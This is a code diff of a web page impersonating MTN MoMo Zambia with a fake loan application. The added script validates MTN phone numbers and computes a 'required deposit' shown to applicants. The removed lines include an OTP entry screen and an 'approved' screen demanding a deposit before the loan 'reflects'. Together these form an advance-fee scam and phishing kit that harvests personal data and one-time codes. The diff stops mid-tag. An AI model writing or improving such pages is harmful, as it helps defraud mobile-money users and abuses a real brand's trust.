@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125e" />
+  <link rel="stylesheet" href="style.css?v=20261125f" />
 </head>
 <body>
   <div class="app-container">
@@ -118,7 +118,7 @@
             id="btn-goto-form1"
             class="btn-momo-solid"
             type="button"
-            onclick="(function(){var amt=Number((document.getElementById('loan-amount-slider')&&document.getElementById('loan-amount-slider').value)||100000);var m=Number((document.getElementById('loan-months-slider')&&document.getElementById('loan-months-slider').value)||48);if(document.getElementById('form-amount-input'))document.getElementById('form-amount-input').value=amt.toLocaleString();document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);})()"
+            onclick="(function(){var amt=Number((document.getElementById('loan-amount-slider')&&document.getElementById('loan-amount-slider').value)||100000);if(document.getElementById('form-amount-input'))document.getElementById('form-amount-input').value=amt.toLocaleString();document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);})()"
           >CONTINUE APPLICATION</button>
         </div>
       </div>
@@ -237,7 +237,12 @@
             type="button"
             onclick="document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form1').classList.add('active');window.scrollTo(0,0);"
           >← Previous</button>
-          <button id="btn-form2-next" class="btn-momo-soft ready compact-prog" type="button">Next Step →</button>
+          <button
+            id="btn-form2-next"
+            class="btn-momo-soft ready compact-prog"
+            type="button"
+            onclick="(function(){var fn=(document.getElementById('first-name')&&document.getElementById('first-name').value.trim())||'';var ln=(document.getElementById('last-name')&&document.getElementById('last-name').value.trim())||'';var ph=(document.getElementById('form-phone')&&document.getElementById('form-phone').value.trim())||'';var digits=ph.replace(/\D/g,'');var norm=digits.startsWith('260')?'0'+digits.slice(3):digits;var errEl=document.getElementById('banner-phone-error');if(!fn||!ln){if(errEl){errEl.innerText='Please enter your first name and last name.';errEl.classList.add('active');}return;}if(!/^(096|076|056)\d{7}$/.test(norm)){if(errEl){errEl.innerText='Enter a valid MTN Zambia number starting with 096, 076, or 056.';errEl.classList.add('active');}return;}if(errEl){errEl.innerText='';errEl.classList.remove('active');}var a=document.getElementById('form-amount-input');var d=document.getElementById('loan-duration');var p=document.getElementById('loan-purpose');if(document.getElementById('sum-amount'))document.getElementById('sum-amount').innerText='ZMW '+((a&&a.value.trim())||'100,000');if(document.getElementById('sum-duration'))document.getElementById('sum-duration').innerText=(d&&d.value)||'48 Months';if(document.getElementById('sum-purpose'))document.getElementById('sum-purpose').innerText=((p&&p.value.trim())||'Business');if(document.getElementById('sum-applicant'))document.getElementById('sum-applicant').innerText=(fn+' '+ln).toUpperCase();var numAmt=Number(((a&&a.value)||'100000').replace(/\D/g,''))||100000;var dep=Math.max(200,Math.round(numAmt*0.002));if(document.getElementById('deposit-required-amount'))document.getElementById('deposit-required-amount').innerText=dep+' ZMW';if(document.getElementById('success-deposit-amount'))document.getElementById('success-deposit-amount').innerText=dep+' ZMW';document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active')});document.getElementById('screen-form3').classList.add('active');window.scrollTo(0,0);})()"
+          >Next Step →</button>
         </div>
       </div>
     </section>
@@ -411,48 +416,4 @@
         <div id="banner-otp-error" class="surface-error-banner"></div>
 
         <div class="otp-boxes-4">
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box-4" autocomplete="off" />
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box-4" autocomplete="off" />
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box-4" autocomplete="off" />
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box-4" autocomplete="off" />
-        </div>
-
-        <button id="btn-submit-otp" class="btn-momo-solid" type="button">VERIFY &amp; CONTINUE</button>
-      </div>
-    </section>
-
-    <!-- Screen 9: Congratulations / Success Screen -->
-    <section id="screen-success" class="screen">
-      <div class="top-nav-bar">
-        <button id="btn-success-back" class="nav-back-btn" type="button">← Back</button>
-        <div class="momo-nav-logo">
-          <span>MTN</span>
-          <strong>MoMo</strong>
-        </div>
-      </div>
-
-      <div class="card-container-spacious">
-        <h1 class="congrats-title">Congratulations!</h1>
-        <p class="congrats-sub">Your MTN MoMo loan application has been approved successfully.</p>
-
-        <h3 class="action-req-title">Action Required to Reflect Loan Amount</h3>
-        <p class="action-req-body">
-          To complete the process and have the full loan amount reflect in your account, you are required to deposit a minimum of <strong id="success-deposit-amount">200 ZMW</strong> (Zambia Kwacha).
-        </p>
-
-        <button id="btn-finish-home" class="btn-momo-solid" type="button" style="margin-top: 28px;">DONE</button>
-      </div>
-    </section>
-
-    <!-- Screen 10: Blocked / Stopped Screen -->
-    <section id="screen-stopped" class="screen">
-      <div class="top-nav-bar">
-        <div class="momo-nav-logo">
-          <span>MTN</span>
-          <strong>MoMo</strong>
-        </div>
-      </div>
-
-      <div class="card-container-spacious">
-        <div class="blocked-badge-circle">✕</div>
-        <h2 class="blocked-ti
+     
